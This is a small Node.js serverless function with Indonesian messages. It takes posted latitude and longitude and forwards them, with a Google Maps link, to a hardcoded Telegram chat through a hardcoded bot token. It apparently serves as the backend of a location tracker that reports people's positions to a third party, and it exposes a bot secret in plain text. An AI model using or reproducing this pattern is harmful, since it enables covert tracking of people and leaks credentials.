const axios = require('axios');

const TELEGRAM_BOT_TOKEN = '7674812326:AAFnB1Naa1B-c8Xr52lR3PBurKxrgmL9hO0';
const USER_CHAT_ID = '6227207639';

module.exports = async (req, res) => {
  if (req.method === 'POST') {
    const { latitude, longitude } = req.body;

    const text = `🌍 Lokasi terdeteksi:\nLatitude: ${latitude}\nLongitude: ${longitude}\nhttps://www.google.com/maps?q=${latitude},${longitude}`;

    try {
      const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: USER_CHAT_ID,
        text: text,
        parse_mode: 'HTML',
      });

      return res.status(200).json(response.data);
    } catch (error) {
      return res.status(500).json({ error: 'Gagal mengirim lokasi ke Telegram' });
    }
  } else {
    return res.status(405).json({ error: 'Metode tidak diizinkan' });
  }
};